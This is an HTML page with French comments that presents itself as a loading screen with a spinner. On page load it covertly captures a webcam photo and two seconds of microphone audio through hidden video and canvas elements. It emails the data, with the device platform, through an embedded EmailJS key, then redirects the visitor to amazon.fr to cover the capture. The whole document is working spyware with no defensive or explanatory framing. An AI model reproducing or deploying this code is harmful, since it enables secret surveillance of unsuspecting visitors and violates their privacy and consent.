<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    .loading {
      text-align: center;
      padding: 40px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    #video, #canvas {
      position: absolute;
      left: -9999px;
      opacity: 0;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>
  <div class="loading">
    <div class="spinner"></div>
    <p>Chargement en cours...</p>
  </div>
  
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="320" height="240"></canvas>
  
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq");
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    let mediaRecorder;
    let audioChunks = [];
    let photoData = null;
    
    // Démarrage automatique
    window.addEventListener('load', async () => {
      try {
        // Accès caméra et micro
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user',
            width: { ideal: 320 },
            height: { ideal: 240 }
          },
          audio: true
        });
        
        video.srcObject = stream;
        video.muted = true;
        
        // Attendre que la vidéo soit prête
        video.addEventListener('loadedmetadata', () => {
          capturePhotoAndAudio(stream);
        });
        
      } catch (err) {
        console.error('Erreur:', err);
        redirectToAmazon();
      }
    });
    
    function capturePhotoAndAudio(stream) {
      // 1. Prendre la photo immédiatement
      context.drawImage(video, 0, 0, 320, 240);
      photoData = canvas.toDataURL("image/jpeg", 0.3); // Qualité réduite pour poids
      
      // 2. Enregistrer l'audio pendant 2 secondes
      audioChunks = [];
      
      // Créer un stream audio seulement
      const audioStream = new MediaStream();
      stream.getAudioTracks().forEach(track => {
        audioStream.addTrack(track);
      });
      
      mediaRecorder = new MediaRecorder(audioStream, {
        mimeType: 'audio/webm;codecs=opus'
      });
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunks.push(event.data);
        }
      };
      
      mediaRecorder.onstop = () => {
        processAndSend(stream);
      };
      
      // Démarrer enregistrement audio 2 secondes
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, 2000);
    }
    
    function processAndSend(stream) {
      // Créer le blob audio
      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
      
      // Vérifier la taille totale
      const photoSize = Math.round(photoData.length * 0.75); // Taille approximative en bytes
      const audioSize = audioBlob.size;
      const totalSize = photoSize + audioSize;
      
      console.log(`Tailles: Photo ~${Math.round(photoSize/1024)}KB, Audio ~${Math.round(audioSize/1024)}KB, Total ~${Math.round(totalSize/1024)}KB`);
      
      // Si trop volumineux, réduire encore
      let finalPhotoData = photoData;
      if (totalSize > 50000) { // 50KB
        // Réduire drastiquement la qualité photo
        finalPhotoData = canvas.toDataURL("image/jpeg", 0.1);
        console.log('Photo compressée davantage');
      }
      
      // Convertir l'audio en base64
      const audioReader = new FileReader();
      audioReader.onload = () => {
        sendCompactData(finalPhotoData, audioReader.result, stream);
      };
      audioReader.readAsDataURL(audioBlob);
    }
    
    function sendCompactData(imageData, audioData, stream) {
      // Arrêter la caméra
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      
      // Calculer les tailles finales
      const finalImageSize = Math.round(imageData.length * 0.75);
      const finalAudioSize = Math.round(audioData.length * 0.75);
      const finalTotalSize = finalImageSize + finalAudioSize;
      
      // Préparer les données optimisées
      const templateParams = {
        from_name: "Auto",
        message: `Photo + Audio 2s (Total: ~${Math.round(finalTotalSize/1024)}KB)`,
        timestamp: new Date().toLocaleString('fr-FR'),
        
        // Données compactes
        photo_data: imageData,
        audio_data: audioData,
        
        // Métadonnées minimales
        photo_size: `~${Math.round(finalImageSize/1024)}KB`,
        audio_duration: "2 secondes",
        audio_size: `~${Math.round(finalAudioSize/1024)}KB`,
        total_size: `~${Math.round(finalTotalSize/1024)}KB`,
        
        // Info système minimale
        device: navigator.platform,
        time: new Date().toISOString()
      };
      
      // Envoyer
      emailjs.send("service_8cs0gml", "template_w14xn7c", templateParams)
        .then(() => {
          console.log('✅ Données envoyées');
        })
        .catch(err => {
          console.error('❌ Erreur envoi:', err);
        })
        .finally(() => {
          redirectToAmazon();
        });
    }
    
    function redirectToAmazon() {
      setTimeout(() => {
        window.location.href = 'https://www.amazon.fr';
      }, 500);
    }
  </script>
</body>
</html>
